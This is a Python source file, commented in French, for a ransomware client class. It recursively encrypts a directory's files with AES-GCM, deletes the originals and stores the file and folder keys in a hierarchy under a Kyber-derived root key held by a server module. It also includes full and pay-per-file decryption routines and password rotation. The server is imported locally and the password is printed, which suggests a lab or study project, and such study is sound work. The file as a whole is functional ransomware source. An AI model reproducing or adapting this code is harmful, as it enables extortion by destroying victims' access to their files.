"""
Gère chiffrement et déchiffrement fichiers
"""

import os
import json
import base64
from typing import Dict
from pathlib import Path

import config
import crypto_utils
import wordlist
from server import server


class RansomwareClient:
    """
    Client chiffrement et déchiffrement fichiers
    """

    def __init__(self, base_path: str = "."):
        """
        Initialise client

        Args:
            base_path: Répertoire pour opérations
        """
        self.base_path = Path(base_path).resolve()
        self.rootkey_path = self.base_path / config.ROOTKEY_FILENAME

    def _should_skip_file(self, file_path: Path) -> bool:
        """
        Vérifie si fichier doit pas être chiffré

        Args:
            file_path: Chemin fichier

        Returns:
            True si fichier doit pas être chiffré
        """
        if file_path.name in config.EXCLUDED_FILES:
            return True
        if file_path.suffix in config.EXCLUDED_EXTENSIONS:
            return True
        return False

    def _should_skip_dir(self, dir_name: str) -> bool:
        """
        Vérifie si dossier doit pas être chiffré

        Args:
            dir_name: Nom dossier

        Returns:
            True si dossier doit pas être chiffré
        """
        return dir_name in config.EXCLUDED_DIRS

    def _save_wrapped_key(self, key_path: Path, key: bytes, wrapping_key: bytes) -> None:
        """Encapsule key avec wrapping_key et sauvegarde dans key_path"""
        wrapped, nonce = crypto_utils.wrap_key_aes_gcm(key, wrapping_key)
        data = {
            "ciphertext": base64.b64encode(wrapped).decode('utf-8'),
            "nonce": base64.b64encode(nonce).decode('utf-8'),
        }
        with open(key_path, 'w') as f:
            json.dump(data, f, indent=2)

    def _load_wrapped_key(self, key_path: Path, wrapping_key: bytes) -> bytes:
        """Charge et désencapsule clé depuis key_path avec wrapping_key"""
        with open(key_path, 'r') as f:
            data = json.load(f)
        wrapped = base64.b64decode(data["ciphertext"])
        nonce = base64.b64decode(data["nonce"])
        return crypto_utils.unwrap_key_aes_gcm(wrapped, wrapping_key, nonce)

    def encrypt_directory(self, path: str = ".") -> None:
        """
        Chiffre tous fichiers d'un dossier de manière récursive et hiérarchique

        Args:
            path: Chemin dossier à chiffrer
        """
        target_path = Path(path).resolve()

        print(f"\n[CLT] Démarrage du chiffrement de {target_path}")

        print("[CLT] Initialisation au serveur")
        server_data = server.initialize_server()

        password = server_data["password"]
        salt = server_data["salt"]
        argon2_params = server_data["argon2_params"]
        kyber_public_key = server_data["kyber_public_key"]

        # Dérive MK avec Argon2
        print("[CLT] Dérive MK")
        master_key = crypto_utils.derive_key_argon2(
            password=password,
            salt=salt,
            **argon2_params
        )

        # Génère RK avec Kyber
        print("[CLT] Génère RK")
        kyber_ciphertext, root_key = crypto_utils.kyber_encapsulate(kyber_public_key)

        # Encapsule RK avec MK
        print("[CLT] Encapsule RK avec MK")
        wrapped_rk_with_tag, wrapped_rk_nonce = crypto_utils.wrap_key_aes_gcm(root_key, master_key)

        # Sauvegarde infos RK dans rootkey.bin
        print(f"[CLT] Sauvegarde de RK dans rootkey.bin")
        rootkey_data = {
            "wrapped_rk_ciphertext": base64.b64encode(wrapped_rk_with_tag).decode('utf-8'),
            "wrapped_rk_nonce": base64.b64encode(wrapped_rk_nonce).decode('utf-8'),
            "kyber_ciphertext": base64.b64encode(kyber_ciphertext).decode('utf-8'),
            "salt": base64.b64encode(salt).decode('utf-8'),
            "argon2_params": argon2_params,
        }

        with open(self.rootkey_path, 'w') as f:
            json.dump(rootkey_data, f, indent=2)

        # Chiffrement récursif hiérarchique
        # Les items à la racine ont root_key comme parent → .key seulement
        # Les items dans sous-dossiers ont folder_key comme parent → .key + .root_key
        print("[CLT] Chiffrement récursif hiérarchique")
        encrypted_count = self._encrypt_dir_recursive(target_path, root_key, root_key, is_root_level=True)

        print(f"\n[CLT] Chiffrement terminé : {encrypted_count} fichier(s) chiffré(s)")
        print(f"[CLT] Mot de passe : {password}")

    def _encrypt_dir_recursive(self, dir_path: Path, parent_key: bytes, root_key: bytes, is_root_level: bool) -> int:
        """
        Chiffrement récursif d'un dossier

        Args:
            dir_path: Dossier à chiffrer
            parent_key: Clé parente pour chiffrer les clés du niveau courant
            root_key: RK pour générer les .root_key des items hors-racine
            is_root_level: True si on est au niveau racine du dossier cible

        Returns:
            Nombre de fichiers chiffrés
        """
        count = 0
        # Snapshot avant modifications
        entries = sorted(dir_path.iterdir())

        for entry in entries:
            if entry.is_dir():
                if self._should_skip_dir(entry.name):
                    continue

                # Génère folder_key aléatoire
                folder_key = crypto_utils.generate_random_key()

                # .key : folder_key chiffré avec parent_key (dans le dossier parent)
                self._save_wrapped_key(
                    dir_path / (entry.name + config.KEY_EXTENSION),
                    folder_key,
                    parent_key
                )

                # .root_key : folder_key chiffré avec root_key (seulement si pas racine)
                if not is_root_level:
                    self._save_wrapped_key(
                        dir_path / (entry.name + config.ROOT_KEY_EXTENSION),
                        folder_key,
                        root_key
                    )

                print(f"  [ENCRYPT DIR] {entry.relative_to(self.base_path)}/")

                # Récursion avec folder_key comme parent
                count += self._encrypt_dir_recursive(entry, folder_key, root_key, is_root_level=False)

            elif entry.is_file():
                if self._should_skip_file(entry):
                    continue

                print(f"  [ENCRYPT] {entry.relative_to(self.base_path)}")
                try:
                    file_key = self._encrypt_file_to_enc(entry)

                    # .key : file_key chiffré avec parent_key
                    self._save_wrapped_key(
                        dir_path / (entry.name + config.KEY_EXTENSION),
                        file_key,
                        parent_key
                    )

                    # .root_key : file_key chiffré avec root_key (seulement si pas racine)
                    if not is_root_level:
                        self._save_wrapped_key(
                            dir_path / (entry.name + config.ROOT_KEY_EXTENSION),
                            file_key,
                            root_key
                        )

                    count += 1
                except Exception as e:
                    print(f"  [ERR] Erreur chiffrement de {entry.name}: {e}")

        return count

    def _encrypt_file_to_enc(self, file_path: Path) -> bytes:
        """
        Chiffre fichier, le sauvegarde en .enc (nonce || ciphertext_with_tag),
        supprime l'original.

        Args:
            file_path: Fichier à chiffrer

        Returns:
            file_key utilisée pour le chiffrement
        """
        with open(file_path, 'rb') as f:
            plaintext = f.read()

        file_key = crypto_utils.generate_random_key()
        ciphertext_with_tag, nonce = crypto_utils.encrypt_aes_gcm(plaintext, file_key)

        # Stocke nonce (12 octets) puis ciphertext_with_tag dans .enc
        enc_path = Path(str(file_path) + config.ENC_EXTENSION)
        with open(enc_path, 'wb') as f:
            f.write(nonce + ciphertext_with_tag)

        file_path.unlink()
        return file_key

    def decrypt_all(self, path: str = ".") -> None:
        """
        Déchiffre tous les fichiers de manière récursive et hiérarchique

        Args:
            path: Chemin dossier à déchiffrer
        """
        target_path = Path(path).resolve()

        print(f"\n[CLT] Démarrage du déchiffrement {target_path}")

        credentials = server.request_full_decryption_credentials()

        password = credentials["password"]
        salt = credentials["salt"]
        argon2_params = credentials["argon2_params"]

        # Dérive MK
        print("[CLT] Dérive MK")
        master_key = crypto_utils.derive_key_argon2(
            password=password,
            salt=salt,
            **argon2_params
        )

        # Lit rootkey.bin et désencapsule RK
        print("[CLT] Lecture de rootkey.bin")
        if not self.rootkey_path.exists():
            raise FileNotFoundError(f"Fichier {config.ROOTKEY_FILENAME} pas trouvé")

        with open(self.rootkey_path, 'r') as f:
            rootkey_data = json.load(f)

        wrapped_rk_with_tag = base64.b64decode(rootkey_data["wrapped_rk_ciphertext"])
        wrapped_rk_nonce = base64.b64decode(rootkey_data["wrapped_rk_nonce"])

        print("[CLT] Désencapsule RK")
        root_key = crypto_utils.unwrap_key_aes_gcm(wrapped_rk_with_tag, master_key, wrapped_rk_nonce)

        # Déchiffrement récursif hiérarchique
        print("[CLT] Déchiffrement récursif hiérarchique")
        decrypted_count = self._decrypt_dir_recursive(target_path, root_key, root_key)

        print(f"\n[CLT] Déchiffrement terminé : {decrypted_count} fichier(s) déchiffré(s)")

    def _decrypt_dir_recursive(self, dir_path: Path, parent_key: bytes, root_key: bytes) -> int:
        """
        Déchiffrement récursif d'un dossier

        Args:
            dir_path: Dossier à déchiffrer
            parent_key: Clé parente pour déchiffrer les .key du niveau courant
            root_key: RK pour déchiffrer les .root_key (déchiffrement partiel)

        Returns:
            Nombre de fichiers déchiffrés
        """
        count = 0
        entries = sorted(dir_path.iterdir())  # snapshot

        # Traite d'abord les sous-dossiers (pour récursion avec folder_key)
        for entry in entries:
            if not entry.is_dir() or self._should_skip_dir(entry.name):
                continue

            key_path = dir_path / (entry.name + config.KEY_EXTENSION)
            root_key_path = dir_path / (entry.name + config.ROOT_KEY_EXTENSION)

            # Préfère .root_key (déchiffré avec root_key) si disponible
            if root_key_path.exists():
                use_path, use_key = root_key_path, root_key
            elif key_path.exists():
                use_path, use_key = key_path, parent_key
            else:
                continue

            try:
                folder_key = self._load_wrapped_key(use_path, use_key)
                if key_path.exists():
                    key_path.unlink()
                if root_key_path.exists():
                    root_key_path.unlink()

                count += self._decrypt_dir_recursive(entry, folder_key, root_key)
            except Exception as e:
                print(f"  [ERR] Dossier {entry.name}: {e}")

        # Traite ensuite les fichiers .enc
        for entry in entries:
            if not entry.is_file() or not entry.name.endswith(config.ENC_EXTENSION):
                continue

            # Nom original = nom .enc sans l'extension .enc
            base_name = entry.name[:-len(config.ENC_EXTENSION)]
            key_path = dir_path / (base_name + config.KEY_EXTENSION)
            root_key_path = dir_path / (base_name + config.ROOT_KEY_EXTENSION)

            # Préfère .root_key (déchiffré avec root_key) si disponible
            if root_key_path.exists():
                use_path, use_key = root_key_path, root_key
            elif key_path.exists():
                use_path, use_key = key_path, parent_key
            else:
                print(f"  [WARN] Pas de .key/.root_key pour {entry.name}")
                continue

            try:
                file_key = self._load_wrapped_key(use_path, use_key)

                with open(entry, 'rb') as f:
                    data = f.read()

                nonce = data[:12]
                ciphertext_with_tag = data[12:]
                plaintext = crypto_utils.decrypt_aes_gcm(ciphertext_with_tag, file_key, nonce)

                original_path = dir_path / base_name
                with open(original_path, 'wb') as f:
                    f.write(plaintext)

                entry.unlink()
                if key_path.exists():
                    key_path.unlink()
                if root_key_path.exists():
                    root_key_path.unlink()

                print(f"  [DECRYPT] {original_path.relative_to(self.base_path)}")
                count += 1
            except Exception as e:
                print(f"  [ERR] {entry.name}: {e}")

        return count

    def decrypt_file(self, file_path: str) -> None:
        """
        Déchiffre un seul fichier via le serveur (paiement individuel).
        Le serveur déchiffre le .root_key avec la root_key et retourne la file_key.

        Args:
            file_path: Chemin du fichier chiffré (.enc) ou nom original
        """
        file_path_obj = Path(file_path).resolve()

        # Détermine enc_path et base_name
        if file_path_obj.name.endswith(config.ENC_EXTENSION):
            enc_path = file_path_obj
            base_name = enc_path.name[:-len(config.ENC_EXTENSION)]
        else:
            base_name = file_path_obj.name
            enc_path = file_path_obj.parent / (base_name + config.ENC_EXTENSION)

        parent_dir = enc_path.parent
        key_path = parent_dir / (base_name + config.KEY_EXTENSION)
        root_key_path = parent_dir / (base_name + config.ROOT_KEY_EXTENSION)

        if not enc_path.exists():
            raise FileNotFoundError(f"Fichier chiffré {enc_path} pas trouvé")

        # Si .root_key existe → item hors-racine → envoyer au serveur
        # Sinon, utiliser .key directement (item racine, déjà chiffré avec root_key)
        rk_path = root_key_path if root_key_path.exists() else key_path
        if not rk_path.exists():
            raise FileNotFoundError(f"Fichier clé pas trouvé pour {base_name}")

        print(f"\n[CLT] Déchiffrement fichier unique via serveur : {base_name}")

        # Charge rootkey.bin pour kyber_ciphertext
        if not self.rootkey_path.exists():
            raise FileNotFoundError(f"Fichier {config.ROOTKEY_FILENAME} pas trouvé")

        with open(self.rootkey_path, 'r') as f:
            rootkey_data = json.load(f)
        kyber_ciphertext = base64.b64decode(rootkey_data["kyber_ciphertext"])

        # Envoie .root_key (ou .key si racine) au serveur → serveur déchiffre avec root_key
        with open(rk_path, 'r') as f:
            rk_data = json.load(f)

        print("[CLT] Envoi clé au serveur pour déchiffrement avec RK")
        file_key = server.decrypt_file_key(rk_data, kyber_ciphertext)

        # Déchiffre le fichier avec file_key
        with open(enc_path, 'rb') as f:
            data = f.read()

        nonce = data[:12]
        ciphertext_with_tag = data[12:]
        plaintext = crypto_utils.decrypt_aes_gcm(ciphertext_with_tag, file_key, nonce)

        original_path = parent_dir / base_name
        with open(original_path, 'wb') as f:
            f.write(plaintext)

        enc_path.unlink()
        if root_key_path.exists():
            root_key_path.unlink()
        if key_path.exists():
            key_path.unlink()

        print(f"[CLT] Fichier déchiffré : {original_path}")

    def change_password(self) -> None:
        """
        Change mdp et màj rootkey.bin
        """
        print("\n[CLT] Changement mot de passe")

        # Génère new mdp et sel
        new_password = wordlist.generate_random_password()
        new_salt = crypto_utils.generate_random_salt()

        # Mêmes paramètres Argon2
        new_argon2_params = {
            "time_cost": config.ARGON2_TIME_COST,
            "memory_cost": config.ARGON2_MEMORY_COST,
            "parallelism": config.ARGON2_PARALLELISM,
            "hash_len": config.ARGON2_HASH_LEN,
        }

        # kyber_ciphertext depuis rootkey.bin
        if not self.rootkey_path.exists():
            raise FileNotFoundError(f"Le fichier {config.ROOTKEY_FILENAME} n'existe pas")

        with open(self.rootkey_path, 'r') as f:
            rootkey_data = json.load(f)

        kyber_ciphertext = base64.b64decode(rootkey_data["kyber_ciphertext"])

        # Demande au serveur changement mdp
        result = server.change_password(new_password, new_salt, new_argon2_params, kyber_ciphertext)

        # Màj rootkey.bin
        print("[CLT] Mise à jour de rootkey.bin")
        rootkey_data = {
            "wrapped_rk_ciphertext": base64.b64encode(result["wrapped_rk_ciphertext"]).decode('utf-8'),
            "wrapped_rk_nonce": base64.b64encode(result["wrapped_rk_nonce"]).decode('utf-8'),
            "kyber_ciphertext": base64.b64encode(kyber_ciphertext).decode('utf-8'),
            "salt": base64.b64encode(result["salt"]).decode('utf-8'),
            "argon2_params": result["argon2_params"],
        }

        with open(self.rootkey_path, 'w') as f:
            json.dump(rootkey_data, f, indent=2)

        print(f"[CLT] Nouveau mot de passe: {new_password}")
